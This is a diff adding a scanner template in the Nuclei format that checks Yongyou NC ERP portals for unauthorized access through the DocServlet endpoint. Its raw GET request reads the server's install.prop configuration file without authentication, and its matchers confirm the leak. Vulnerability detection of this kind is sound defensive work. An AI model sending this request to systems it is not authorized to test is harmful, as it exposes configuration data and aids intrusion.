@@ -1,0 +1,32 @@
+id: yongyou-nc-portal-docservlet-unauthorized-access
+info:
+  name: Yongyou NC portal_docServlet Unauthorized Resource Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: resource-management,error
+
+variables:
+  paths:
+    - "service/~webrt/nc.uap.lfw.file.action.DocServlet"
+    - "servlet/~webrt/nc.uap.lfw.file.action.DocServlet"
+
+http:
+  - raw:
+      - |
+        GET /{{paths}}?disp=/install.prop HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[CONFIG]"
+          - "[STEPPANEL]"
+          - "title=UFIDA ERP-NC Setup"
+      - type: word
+        words:
+          - "<"
+        negative: true
